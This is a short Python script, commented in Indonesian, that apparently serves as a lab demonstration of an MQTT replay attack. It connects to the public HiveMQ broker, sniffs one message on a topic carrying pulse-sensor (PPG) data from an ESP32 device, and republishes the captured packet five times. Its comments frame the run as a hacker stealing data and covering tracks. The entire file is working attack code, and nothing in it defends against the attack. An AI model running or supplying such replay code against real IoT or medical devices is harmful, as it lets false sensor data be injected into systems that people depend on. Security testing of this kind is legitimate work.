import paho.mqtt.client as mqtt
import time

# Target Topik (Bisa diubah ke sha3_ppg atau secure_ppg sesuai kebutuhanmu)
TARGET_TOPIC = "arsyad/brawijaya_med/sha3_ppg" 

# Variabel global untuk menyimpan data curian
stolen_payload = None
is_packet_captured = False

# Fungsi yang dieksekusi saat ada data lewat di jaringan
def on_message(client, userdata, msg):
    global stolen_payload, is_packet_captured
    
    # Tangkap paketnya HANYA JIKA kita belum punya curian
    if not is_packet_captured:
        stolen_payload = msg.payload.decode("utf-8")
        is_packet_captured = True
        print(f"\n[FASE 1] SNIFFER BERHASIL! Paket tertangkap:")
        print(f"Isi: {stolen_payload[:60]}... (disensor sebagian)")

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_message = on_message

print("Menghubungkan komputer Hacker ke broker HiveMQ...")
client.connect("broker.hivemq.com", 1883, 60)

print(f"Hacker mengintai di topik '{TARGET_TOPIC}'...")
client.subscribe(TARGET_TOPIC)

# Memulai proses jaringan di latar belakang
client.loop_start()

# --- FASE 1: MENUNGGU KORBAN ---
print("Menunggu ESP32 mengirimkan data...")
while not is_packet_captured:
    time.sleep(0.1) # Tunggu terus sampai is_packet_captured berubah menjadi True

# Jika sudah dapat, berhenti menyadap agar tidak bingung sendiri
client.unsubscribe(TARGET_TOPIC)

print("\nPaket berhasil dikantongi! Menyiapkan meriam untuk serangan...")
time.sleep(2) # Jeda dramatis 2 detik

# --- FASE 2: MELUNCURKAN REPLAY ATTACK ---
print("\n[FASE 2] MELUNCURKAN REPLAY ATTACK!!!")
for i in range(5): # Mengirim ulang data curian sebanyak 5 kali
    client.publish(TARGET_TOPIC, stolen_payload)
    print(f"--> Tembakan paket palsu (rekaman) ke-{i+1} berhasil dikirim!")
    time.sleep(1.5) # Jeda antar serangan

# Bersih-bersih setelah selesai menyerang
client.loop_stop()
client.disconnect()
print("\n[] Serangan selesai. Hacker memutus koneksi dan menghilangkan jejak.")